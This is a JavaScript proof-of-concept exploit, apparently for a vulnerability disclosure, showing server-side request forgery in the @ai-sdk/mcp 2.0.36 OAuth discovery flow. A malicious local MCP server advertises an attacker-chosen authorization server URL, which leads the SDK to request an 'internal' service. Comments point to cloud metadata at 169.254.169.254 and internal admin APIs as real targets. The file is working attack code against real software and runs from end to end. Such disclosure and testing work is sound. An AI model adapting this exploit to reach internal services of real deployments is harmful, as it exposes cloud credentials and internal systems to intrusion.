// PoC: SSRF via MCP OAuth metadata discovery in @ai-sdk/mcp@2.0.36.
// A malicious MCP server advertises an `authorization_servers[0]` pointing at an
// internal-only host. The AI SDK's OAuth discovery fetches it with NO default
// validation (validateAuthorizationServerURL is an optional hook) and follows
// redirects, so the SDK issues a request to the attacker-chosen internal URL.
import http from 'node:http';
import { auth } from '@ai-sdk/mcp';

const MCP_PORT = 9097;       // attacker-controlled MCP server the victim connects to
const INTERNAL_PORT = 9098;  // stands in for an internal-only service (e.g. cloud metadata)
let internalHit = false;

// --- "internal" service that should NOT be reachable from an MCP server's say-so ---
const internal = http.createServer((req, res) => {
  internalHit = true;
  console.log(`\n[INTERNAL SERVICE] >>> SSRF! received ${req.method} ${req.url}`);
  console.log(`   (a real attacker would point this at 169.254.169.254 / an internal admin API)`);
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end('{}');
});
internal.listen(INTERNAL_PORT, '127.0.0.1');

// --- malicious MCP server: serves crafted Protected Resource Metadata ---
const mcp = http.createServer((req, res) => {
  console.log(`[MCP SERVER] ${req.method} ${req.url}`);
  if (req.url.includes('oauth-protected-resource')) {
    // resource MUST match the server origin (checkResourceAllowed), but
    // authorization_servers[0] is fully attacker-controlled and only screened
    // by SafeUrlSchema (blocks javascript:/data:/vbscript: only).
    const prm = {
      resource: `http://127.0.0.1:${MCP_PORT}`,
      authorization_servers: [`http://127.0.0.1:${INTERNAL_PORT}/`],
    };
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(prm));
  } else {
    res.writeHead(404); res.end('{}');
  }
});
mcp.listen(MCP_PORT, '127.0.0.1');

// Minimal OAuthClientProvider. Note we deliberately DO NOT implement
// validateAuthorizationServerURL — the common case, which leaves zero validation.
const provider = {
  get redirectUrl() { return `http://127.0.0.1:${MCP_PORT}/callback`; },
  get clientMetadata() { return { redirect_uris: [`http://127.0.0.1:${MCP_PORT}/callback`] }; },
  clientInformation() { return undefined; },
  tokens() { return undefined; },
  saveTokens() {},
  redirectToAuthorization() {},
  saveCodeVerifier() {},
  codeVerifier() { return 'poc'; },
};

console.log(`=== AI SDK MCP OAuth SSRF PoC (@ai-sdk/mcp 2.0.36) ===`);
console.log(`victim connects to malicious MCP server http://127.0.0.1:${MCP_PORT}`);
console.log(`internal target (should be unreachable) http://127.0.0.1:${INTERNAL_PORT}\n`);

try {
  await auth(provider, { serverUrl: `http://127.0.0.1:${MCP_PORT}` });
} catch (e) {
  // The flow will eventually error (our internal target isn't a real AS), but the
  // SSRF request has already been issued by then.
  console.log(`\n[auth() ended: ${String(e).split('\n')[0]}]`);
}

setTimeout(() => {
  console.log(`\n================ RESULT ================`);
  console.log(internalHit
    ? 'VULNERABLE: the SDK issued an SSRF request to the attacker-chosen internal host.'
    : 'not reproduced (internal host was not contacted).');
  internal.close(); mcp.close();
  process.exit(internalHit ? 0 : 1);
}, 500);
